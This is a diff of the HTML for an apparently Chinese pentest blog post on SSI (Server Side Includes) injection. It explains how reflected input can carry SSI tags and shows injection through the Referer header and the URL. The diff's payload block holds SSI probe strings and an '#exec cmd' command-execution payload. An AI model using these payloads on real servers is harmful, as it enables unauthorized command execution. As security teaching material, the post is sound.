@@ -82,42 +82,27 @@
     [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SSI%E6%B3%A8%E5%85%A5">SSI注入</a>)
 </div>
 
-      <div>
-
-<h3 id="0x00-ssi">0x00 SSI</h3>
-
+      <div><h3 id="0x00-ssi">0x00 SSI</h3>
 <p>SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p>
-
 <p>在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞</p>
-
 <p>若注入点在url中则可能需要进行url编码</p>
-
 <h3 id="0x01-payload">0x01 payload</h3>
+<pre tabindex="0"><code>&#34;--&gt;&#39;--&gt;`--&gt;&lt;!--#set var=&#34;a&#34; value=&#34;123&#34;--&gt;&lt;!--#set var=&#34;b&#34; value=&#34;654&#34;--&gt;&lt;!--#echo var=&#34;a&#34;--&gt;&lt;!--#echo var=&#34;b&#34;--&gt;
 
-<pre><code>&quot;--&gt;'--&gt;`--&gt;&lt;!--#set var=&quot;a&quot; value=&quot;123&quot;--&gt;&lt;!--#set var=&quot;b&quot; value=&quot;654&quot;--&gt;&lt;!--#echo var=&quot;a&quot;--&gt;&lt;!--#echo var=&quot;b&quot;--&gt;
+&lt;!--#echo var=&#34;DATE_LOCAL&#34; --&gt;
 
-&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;
-
-&lt;!--#exec cmd=&quot;dir&quot; --&gt;
-</code></pre>
-
-<h3 id="0x02-示例">0x02 示例</h3>
-
+&lt;!--#exec cmd=&#34;dir&#34; --&gt;
+</code></pre><h3 id="0x02-示例">0x02 示例</h3>
 <ul>
 <li>Referer被输出到了页面中</li>
 </ul>
-
-<p><img src="/img/post/ssi_in_referer_request.png" alt="ssi漏洞" /></p>
-
-<p><img src="/img/post/ssi_in_referer_response.png" alt="ssi漏洞" /></p>
-
+<p><img src="/img/post/ssi_in_referer_request.png" alt="ssi漏洞"></p>
+<p><img src="/img/post/ssi_in_referer_response.png" alt="ssi漏洞"></p>
 <ul>
 <li>url中的数据被输出到页面中(有时候url中的payload需要url编码)</li>
 </ul>
-
-<p><img src="/img/post/ssi_in_url_request.png" alt="ssi漏洞" /></p>
-
-<p><img src="/img/post/ssi_in_url_response.png" alt="ssi漏洞" /></p>
+<p><img src="/img/post/ssi_in_url_request.png" alt="ssi漏洞"></p>
+<p><img src="/img/post/ssi_in_url_response.png" alt="ssi漏洞"></p>
 </div>
     </article>
   </main>
